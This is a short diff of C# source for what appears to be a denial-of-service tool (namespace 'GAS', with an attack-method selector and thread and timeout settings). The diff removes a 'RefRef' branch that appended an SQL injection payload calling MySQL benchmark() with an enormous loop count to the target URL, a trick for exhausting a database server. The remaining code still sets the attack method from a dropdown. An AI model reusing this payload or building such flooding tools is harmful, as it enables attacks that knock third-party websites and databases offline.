@@ -64,13 +64,7 @@ namespace GAS
         {
             #region Configure
             Core.Subsite = txtSubsite.Text;
-            if (cbMethod.Text != "RefRef")
                 Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), cbMethod.Text);
-            else
-            {
-                Core.Method = GAS.Core.AttackMethod.HTTP;
-                Core.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
-            }
                 //if (!int.TryParse(txtTimeout.Text, out Core.Timeout)) { Core.Timeout = 30; txtTimeout.Text = Core.Timeout.ToString(); }
                 //if (!int.TryParse(txtThreads.Text, out Core.Threads)){ Core.Threads = 10; txtThreads.Text = Core.Threads.ToString();}
                 //if (!int.TryParse(txtSLSpT.Text, out Core.SPT)){Core.SPT = 50;txtSLSpT.Text = Core.SPT.ToString(); }
